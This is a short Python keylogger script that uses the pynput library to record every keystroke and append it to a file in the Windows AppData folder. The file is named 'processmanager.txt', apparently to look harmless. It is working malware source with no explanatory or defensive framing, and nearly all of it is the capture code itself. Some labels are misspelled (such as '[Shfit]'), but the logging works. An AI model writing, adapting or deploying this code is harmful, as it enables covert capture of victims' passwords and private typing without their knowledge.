import os 
from pynput.keyboard import Listener




keys = []
count = 0
path = os.environ['appdata'] + '\\processmanager.txt' #Windows
#path = 'processmanager.txt' #Linux



def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys =[]



def write_file(keys):
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if 'backspace' in k:
                f.write('[Backspace]')

            elif 'enter' in k:
                f.write('\n')

            elif 'shift' in k:
                f.write('[Shfit]')

            elif 'space' in k:
                f.write(' ')
            
            elif 'caps_look' in k:
                f.write('[Caps_lock')

            elif 'key' not in k:
                f.write(k)



with Listener(on_press=on_press) as Listener:
    Listener.join()